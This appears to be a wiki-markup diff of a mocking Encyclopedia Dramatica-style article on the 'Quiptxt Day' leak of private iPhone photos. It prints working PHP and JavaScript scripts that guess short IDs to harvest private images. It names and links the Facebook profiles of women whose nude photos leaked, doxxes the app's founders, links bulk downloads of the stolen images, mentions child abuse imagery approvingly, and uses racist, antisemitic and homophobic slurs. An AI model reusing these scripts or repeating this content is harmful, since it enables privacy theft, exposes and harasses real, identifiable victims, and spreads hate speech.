@@ -1,0 +1,215 @@
+Quiptxt Day
+<center>[[File:Quiptxt founder stressed.png]]</center>
+
+[[Image:Quiptxt_script.jpg|thumb|Output from the original quiptxt script.]]
+[[Image:1269828690787.jpg|thumb|Even White House government workers used QuipTxt.  Obama has an iPhone.  Did he take this picture?]]
+
+'''Quip Text''' was a $0.99 [[iPhone]] application used by Applefags for cheaply sending [[pic]]s, mainly of their small and poorly circumcised [[penis]]es and sloppy meat-curtain [[vagina]]s to friends and family. The EPICNESS that is ''Quiptext Day'' is the result of [[Writing Yourself Into An Article|Palpacino]] and, several months later, [[Anonymous]] realizing that the protocol for sending these pics was secured by only a five digit alphanumeric code; [[random]]ize this code using some [[derp|simple]] [[PHP]] programing, and the millions of pics that these massive retards had sent came spilling out, swamping /b/ with the biggest tsunami of [[chemo]]-[[OC]] ever. Within hours, the Quip Text website was shutdown and taken offline, but not before the supposedly private photos of millions of iPhone users were shared with the world. Thus, massive fail became epic win. In addition to the standard pictures of cocks and tits and vaginas, there are pictures of [[CP]], what looks to be possibly photos taken by a serial killer of dead chicks with plastic bags over their heads on hotel room floors, [[gore]], self-penetration with massive objects, and every other random awesomeness that perfectly normal everyday people do when they think no one will find out.<br/><br/>
+Originally when this was discovered the URLs on the quiptext site contained names, as well as original messages sent. It was later changed to just photos. [[exploit|This is how most Facebook accounts were linked to the photos]].<br/><br/>
+As one Anon put it:
+*Saturday: No one knows about your company.
+*Sunday: Anon Finds your company and everyone knows about your company.
+*Monday: You have no company.
+
+==Ish comments on [[Reddit]]==
+===Original comment from Ish===
+{{quote|Hello, this is Ish, the founder of Addy Mobile, makers of the Quip app.
+As soon as this post came to our attention, we immediately shut down our servers. We have also now disabled all S3 access and have started to systematically secure all files in the system. We will not bring the system back up until we have adequate security around all files shared over Quip.
+I apologize to our users for this security breach and promise we will do everything in our power to make sure none of their information is exposed once we bring the service back up.
+The vision for Quip has always been to provide users a quick, simple, and affordable way for iPhone users to send picture messages without paying exorbitant carrier fees. We are a small company (3 people) but we will work as quickly as possible to bring back the service up in a safe and secure manner.
+-Ish|[http://www.reddit.com/r/pics/comments/bjezp/massive_privacy_fail_quiptxtcom_is_a_site_that/ Ish]}}
+===What Ish Really Meant===
+{{quote|Hello, this is Ish, the founder of Addy Mobile, makers of the Quip app.
+So we made this dumb shit so you cheap bastards could send pictures and shit, but all we really wanted was teh monies, so instead of funding security we shifted the budget to she-male prostitutes, inter-species erotica, and blow. Shit was so ca$h. We're sorry ladies, but your vaginas are now all over the interwebs. Oh, and guys, your cawks aren't safe either. These pictures of your indecent and morally bankrupt behavior probably won't come back to harm you. The worst that is likely to happen is some creepy perv is jerkin it to your underage photos and decides to stalk you. Here's hoping your genitals don't get turned into a wind chime or a lampshade. 
+
+So, well, shit.  Fuck me.
+
+-Ish}}
+
+===Some replies to said comment===
+<center>{{morphquote|quiptxtreplies|background-color: white;|font-weight: bold;|
+
+A breach in security? A breach would imply that there was some flaw in your security. What you had was a complete lack of security.
+Putting the photos on a hosted server? I refuse to believe anyone is that incompetent. You were just lazy with people's private data, and got called out on it.|[http://www.reddit.com/r/pics/comments/bjezp/massive_privacy_fail_quiptxtcom_is_a_site_that/ rampantdissonance]
+
+|[http://www.reddit.com/r/pics/comments/bjezp/massive_privacy_fail_quiptxtcom_is_a_site_that/c0n3cac palpacino] discovered this flaw a year ago, and posted about it on both digg and 4chan.
+Many people have known how to access and download gigabytes of private information off your site, and you only resorted to IP banning one such user. This is much more than a security breach... not using appropriate encryption when handling private information is just extremely irresponsible.
+A 5 character hash?! REALLY?|[http://www.reddit.com/r/pics/comments/bjezp/massive_privacy_fail_quiptxtcom_is_a_site_that/ rolmos]
+
+|No. Excuse.
+I'm a web developer also, and there's just no excuse for this - this isn't an oversight, a mistake, or unforeseen happenstance... this is willful and negligent incompetence, if not worse.
+You don't need a CS degree to know this. You don't need years of experience in the industry for this - I know 8 year-olds who can call this problem out into the open as soon as they saw it.
+For the sake of the rest of us in this industry, maybe you should leave it.
+If what I'm reading below is true (that this has been known and in the wild for over a year), then you guys really need to burn for this. That's the line between just being wildly incompetent, and maliciously disregarding your users' privacy.
+I hope your service never comes back up - there are a bajillion people in the world who can implement while demonstrating one iota of competence.|[http://www.reddit.com/r/pics/comments/bjezp/massive_privacy_fail_quiptxtcom_is_a_site_that/ potatolicious]}}</center>
+
+{{cs|quiptxtscripts|Quiptxt Scripts|{{clear}}
+'''Original PHP Script'''
+<pre><html>
+<head>
+	<title>search</title>
+	<script language="JavaScript">
+	function notFound(image) {
+		image.style.display = "none";
+	}
+	</script>
+</head>
+<body>
+<?php
+for ($i=0; $i<2000; $i++) {
+	$link = genLink();
+
+	echo "<a href='http://pic.quiptxt.com/".$link."' target='_blank'><img alt='' width='100' height='100' border='0'src='http://quipimg.s3.amazonaws.com/".$link.".jpg' onerror='notFound(this);'></a> ";
+}
+
+function genLink() {
+	// characters to use
+	$chars = array_merge(range('a','z'),range('0','9'));
+
+	// shuffle array
+	shuffle($chars);
+
+	// return characters
+	return substr(implode('',$chars),0,5);
+}
+?>
+</body>
+</html></pre>
+
+'''Later Revised PHP Code'''
+<pre><?php
+$c="abcdefghijklmnopqrstuvwxyz0123456789";while(++$y){echo"<img
+src=http://quipimg.s3.amazonaws.com/";for($z=1;$z<=5;$z++)echo$c[mt_rand(0,35)];
+echo".jpg onerror=\"this.style.display='none'\">";if($y>=1000)break;}
+?>
+</pre>
+
+'''Java Script code'''
+<pre><html>
+
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Quip</title>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js" type="text/javascript"></script>
+</head>
+
+<body>
+<img id="quip" width=1 height=1 style="display: none" src="quip.jpg" onerror="randquip()" onload="found();" />
+<div id="info"></div>
+<div id="save"></div>
+
+<script type="text/javascript">
+function found() {
+$("#save").prepend("<a target='_new' href='http://pic.quiptxt.com/"+id+"'><img src='http://quipimg.s3.amazonaws.com/" + id + ".jpg' title='"+id+"' /></a> ");
+randquip();
+}
+function randquip() {
+var letters = new Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0" );
+var r1 = Math.floor(Math.random() * letters.length);
+var r2 = Math.floor(Math.random() * letters.length);
+var r3 = Math.floor(Math.random() * letters.length);
+var r4 = Math.floor(Math.random() * letters.length);
+var r5 = Math.floor(Math.random() * letters.length);
+
+id = letters[r1] + letters[r2] + letters[r3] + letters[r4]+ letters[r5];
+$("#quip").attr("src", "http://quipimg.s3.amazonaws.com/" + id + ".jpg");
+$("#info").html("<b>" + id + "</b>");
+}
+// randquip();
+// setInterval(randquip, 5000);
+</script>
+
+</body>
+</html>
+</pre>|0}}
+
+==Facebook Victims==
+{{cg|Facebook Gallery|facebookgal|center|<gallery>
+File:14b25if.png|Anna Joubert
+File:PorsheBassett.jpg|[http://www.facebook.com/profile.php?id=710248734&ref=ts Porshe Bassett]
+File:Ellie_Broussard.jpg|[http://www.facebook.com/profile.php?id=1178893573&ref=search&sid=100000281204060.651183070 Ellie Broussard]
+File:Katelyn_Green.jpg|[http://www.facebook.com/profile.php?id=10720894&ref=ts Katelyn Green]</gallery>|<gallery>
+File:Kelsey_Nicole_Keimig.jpg|[http://www.facebook.com/profile.php?id=1538901770&ref=ts Kelsey Nicole Keimig]
+File:Kristi_Gaspard.jpg|[http://www.facebook.com/profile.php?id=1231702440&ref=ts Kristi Gaspard]
+File:Patti_Hickman.jpg|[http://www.facebook.com/elmendorfpatti?ref=ts Patti_Hickman]
+File:Nathalie_Day.jpg|[http://www.facebook.com/profile.php?id=1001201498&ref=ts Nathalie Day]
+File:Misty_Keene.jpg|[http://www.facebook.com/profile.php?id=9217609 Misty Keene]
+File:Wendy_Hanson.jpg|[http://www.facebook.com/profile.php?id=100000417864314 Wendy Hanson]
+File:Brandy_Glidewell.jpg|[http://www.facebook.com/profile.php?id=100000532302669 Brandy Glidewell]
+File:Cassundra_Hebert.jpg|[http://www.facebook.com/cassundra Cassundra Hebert]
+File:Heather_Monroe.jpg|Heather Monroe
+File:Annasbro.jpg|Bawww. Brother of victim.
+File:Lolannatrolled.JPG|Anna on her school's facebook page.
+File:Annasfriend.JPG|Her friend chimes in.
+File:Quiptxt porshe.png
+File:Quiptxt karli.jpg
+File:Quiptxt facebook lulz.jpg
+File:Quiptxt ashley fritz 1.jpg
+File:Quiptxt ashley fritz.jpg
+</gallery>}}
+
+==Images==
+{{cg|quiptxtgallery|quippp|center|<gallery>
+File:Quiptext tits.jpg|Always related.
+File:Quiptxt day r9k.jpg|Original thread.
+File:Quiptxt_aaeyd.jpg|More tits.
+File:Quiptxt2.jpg|Military?</gallery>|<gallery>
+File:Quiptxt_aagnv.jpg|He will become a fine [[lawyer]].
+File:Quiptxt_aadge.jpg|
+File:Fineforms.jpg|Nice shape
+File:Bodyz.jpg|She want you
+File:Liplip.jpg|Lips
+File:Lipps.jpg|more lips
+File:Tittas.jpg|tittas
+File:Quiptxt_a3u4b.jpg|Ass
+File:Quiptxt_Dead_Lady.jpg|Dead lady
+</gallery>}}
+
+== The Greedy Retards who created Quiptxt ==
+{|style="border: 2px solid #000000;" cellpadding=5 cellspacing=0 align="center"
+|[[Image:Cowbell_small.jpg]]
+|<big>'''This section needs [[moar]] [[dox]].'''</big><br> You can help by [http://www.encyclopediadramatica.com/index.php?title=Quiptxt_Day&action=edit&section=7&hl=1 adding moar dox.]
+|}
+<br clear="all">
+To the surprise of no-one the stunning greed and programming incompetence of Quiptxt were the result of a Jew and a [[India|Chutney Fucker]].  Should have let an American do it, lol. We hope they get [[v&]] for hosting all the [[jailbait]] and be forced to spend their remaining days in a cell with [[Bubba]] who will make their assholes bleed [[for great justice]].
+===[[Paki|Ish]] Harshawat===
+*[[Gay|SF Based]] Entrepreneur, Co-Founder of Quiptxt
+*[http://www.linkedin.com/in/ishharshawat linkedin]
+*[http://bigsight.org/ish_harshawat bigsight]
+*[http://twitter.com/ishishbuzzbox twitter]
+*[http://twitter.com/ishish 2nd twitter]
+*[http://www.faqs.org/patents/inv/380770 patents]
+
+===Blake EngelJew===
+*Ish's gay entrepreneur fuckbuddy, Co-Founder of Quiptxt
+*[http://www.linkedin.com/in/blakeengel linkedin]
+*[http://twitter.com/urbanhiker twitter]
+*[http://www.flickr.com/photos/urbanhiker flickr]
+*[http://friendfeed.com/urbanhiker friendfeed]
+
+{{cg|QuiptxtCo-founders|bookface|center|<gallery>
+File:Ish Harshawat2.jpg|Ish Harshawat
+File:Ish Harshawat1.jpg|Ish Harshawat
+File:blake_engel2.jpg|Blake Engel
+File:Blake_engel1.jpg|Blake Engel
+</gallery>|}}
+
+==See Also==
+*[[Apple]]
+*[[CSIII]]
+*[[iPod]]
+*[[Guys with iPhones]]
+*[[Amateur porn]]
+
+==External Links==
+*[http://pastebin.com/WZJcXeLF Pastebin of original code]
+*[http://www.quiptxt.com A few hours after thousands of chemo-OC pics were grabbed, site went down for "maintenance"]
+*[http://www.facebook.com/group.php?gid=108636472491674 Facebook group]
+*[http://www.megaupload.com/?d=6QGOCDKW 40 Mb of sweet OC from quip]
+*[http://www.filefactory.com/file/b0e9892/n/out.rar 256 MOAR MB of OC]
+*[http://sharebee.com/75af14d1 15 MB of gurls]
+*[http://digg.com/security/Quip_TXT_for_iPhone_FAIL_WIN_NSFW Earliest known mention of exploit by palpacino]
+*[http://dressundressed.com/?p=191 Some of teh nudes with fb accounts]
+*[http://www.kgw.com/news/special-reports/iPhone-app-leaves-Portland-woman-overexposed-92469334.html Story about one of the girls who got facebook trolled, who's picture is on ED]
+
+[[Category:Chans]][[Category:Events]]
